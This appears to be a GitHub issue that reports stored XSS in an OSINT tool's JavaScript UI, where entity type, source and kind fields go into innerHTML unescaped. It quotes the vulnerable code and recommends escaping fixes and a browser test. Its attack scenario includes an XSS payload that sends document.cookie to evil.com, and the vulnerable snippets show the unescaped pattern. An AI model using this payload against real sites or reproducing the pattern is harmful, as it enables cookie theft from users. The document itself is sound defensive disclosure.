# Issue #34: Stored XSS via unescaped entity.type field in innerHTML template literals

- **State:** open
- **Created:** 2026-06-08T11:42:31Z
- **Updated:** 2026-06-08T11:42:31Z
- **Labels:** None

---

## Summary
`static/js/estorides.js` renders `entity.type` and `e.type` directly into `innerHTML` template literals without HTML escaping in at least three locations (lines 1068, 1106, 1632). If a malicious OSINT source returns a crafted entity type string containing HTML, it will execute in the operator's browser. The `escapeHTML` function exists in the codebase and is used for `entity.value` — but `entity.type` is treated as trusted when it is not.

## Evidence
`static/js/estorides.js` line 1068:
```js
div.innerHTML = `
  <span class="type">${e.type}</span>          // UNESCAPED
  <span class="value">${escapeHTML(e.value)}</span>
  <span class="srcs">${e.source}</span>         // ALSO UNESCAPED
```

`static/js/estorides.js` line 1106:
```js
row.innerHTML = `<span style="color:${colorForKind(e.kind)}">${e.type}</span>...`
// e.type unescaped, e.kind unescaped in a style= attribute
```

`static/js/estorides.js` line 1632 (discoverer stream section):
```js
div.innerHTML = `
  <span class="type">${entity.type}</span>    // UNESCAPED
  <span class="value">${escapeHtml(entity.value)}</span>
```

## Why this matters
Entity types come from upstream OSINT sources via API responses. A malicious or compromised upstream API (ThreatFox, URLhaus, OTX, MalwareBazaar — all ingested without sanitisation at the parse layer) can return a crafted `type` field. Any HTML in that field is rendered directly by the browser. Since the CSP includes `style-src 'unsafe-inline'`, a CSS injection via the `colorForKind` path is also viable.

## Attack or failure scenario
1. An attacker who controls a mocked or compromised OSINT source (or who performs a man-in-the-middle on an HTTP OSINT endpoint) injects `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` as the entity type string.
2. The orchestrator stores this as an entity in the case store.
3. The operator opens the UI; the entity renders; the script executes.
4. If the operator has authenticated sessions to other services open in the same browser, those cookies/tokens can be exfiltrated.

## Root cause
Inconsistent use of `escapeHTML`. The `value` field is always escaped; the `type`, `source`, `kind`, and `srcs` fields are not. This suggests the escaping was added reactively for values but the assumption that `type` is always a safe enum was never validated.

## Recommended fix
1. Apply `escapeHTML` to every field interpolated into an `innerHTML` template string: `type`, `kind`, `source`, `srcs`, `category`, and any other field that originates from external data.
2. Audit all `innerHTML` and `insertAdjacentHTML` calls in `estorides.js` for unescaped variables.
3. Consider switching to `textContent` for purely text nodes and using `createElement` + `appendChild` for structured HTML, which eliminates the class of issue at the root.
4. Add a CSP linter to CI that flags new `innerHTML` assignments.

## Acceptance criteria
- All `innerHTML` and `insertAdjacentHTML` template literals pass every variable through `escapeHTML`/`escapeAttr` as appropriate.
- A browser test (Playwright or Cypress) verifies that a synthetic entity with `type` set to `<img src=x onerror=alert(1)>` renders as literal text, not as a script.

## Suggested labels
security, bug

## Priority
P1

## Severity
High — Stored XSS via entity type field rendered by the UI without escaping. Exploitation requires a malicious or compromised upstream OSINT data source, which is a realistic threat model for a tool that ingests from 99+ external APIs.

## Confidence
Confirmed — the unescaped interpolations are present at the listed line numbers in the committed code.
